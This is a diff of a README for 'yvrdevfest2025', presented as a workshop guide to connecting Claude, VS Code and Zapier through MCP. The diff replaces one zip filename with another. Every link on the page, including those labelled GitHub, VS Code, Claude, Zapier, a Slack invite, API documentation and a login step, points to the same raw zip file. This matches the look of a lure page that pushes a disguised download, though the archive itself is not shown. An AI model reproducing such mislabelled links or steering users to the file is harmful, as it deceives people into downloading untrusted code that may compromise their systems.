@@ -1,6 +1,6 @@
 # 🎉 yvrdevfest2025 - Connect Your Tools to AI Effortlessly
 
-[![Download yvrdevfest2025](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip)
+[![Download yvrdevfest2025](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,17 +11,17 @@ Welcome to the yvrdevfest2025 repository! This guide will help you download and 
 Before you dive in, make sure you have the following:
 
 - A laptop with an internet connection
-- A [GitHub](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip) account (any type works)
-- [VS Code](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip) with GitHub Copilot
-- A [Claude](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip) account (paid version needed for full capabilities)
-- A [Zapier](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip) account (free version works fine)
+- A [GitHub](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip) account (any type works)
+- [VS Code](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip) with GitHub Copilot
+- A [Claude](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip) account (paid version needed for full capabilities)
+- A [Zapier](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip) account (free version works fine)
 - A curious mind to explore new technologies
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the necessary files:
 
-[Visit this page to download](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip)
+[Visit this page to download](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip)
 
 Once you're on the Releases page, look for the latest version of the application. Download the file that suits your operating system.
 
@@ -35,13 +35,13 @@ Once you're on the Releases page, look for the latest version of the application
 
 ## 💡 Join the Community
 
-Connect with other users and get support by joining the Undestroyers Slack channel. Here’s your invite link: [Join Undestroyers Slack](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip).
+Connect with other users and get support by joining the Undestroyers Slack channel. Here’s your invite link: [Join Undestroyers Slack](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip).
 
 ## 🌟 Step-by-Step Exercise
 
 ### 🔧 Step 0: Set Up Your MCP Server in Zapier
 
-1. Go to [https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip) and log in with your account.
+1. Go to [https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip) and log in with your account.
 2. Follow the prompts to create a new MCP server.
 
 ### 🔌 Step 1: Connect to Claude
@@ -80,8 +80,8 @@ If you have questions or need help, feel free to reach out in the Undestroyers S
 
 For more detailed instructions, feel free to check these resources:
 
-- [VS Code Setup](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip)
-- [Claude API Documentation](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip)
-- [Zapier MCP Guide](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip)
+- [VS Code Setup](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip)
+- [Claude API Documentation](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip)
+- [Zapier MCP Guide](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip)
 
-[Download yvrdevfest2025 again for easy access](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest2025_v2.2-beta.4.zip). Happy exploring!
+[Download yvrdevfest2025 again for easy access](https://raw.githubusercontent.com/For-Works/yvrdevfest2025/main/weather-server/yvrdevfest-3.1-alpha.5.zip). Happy exploring!
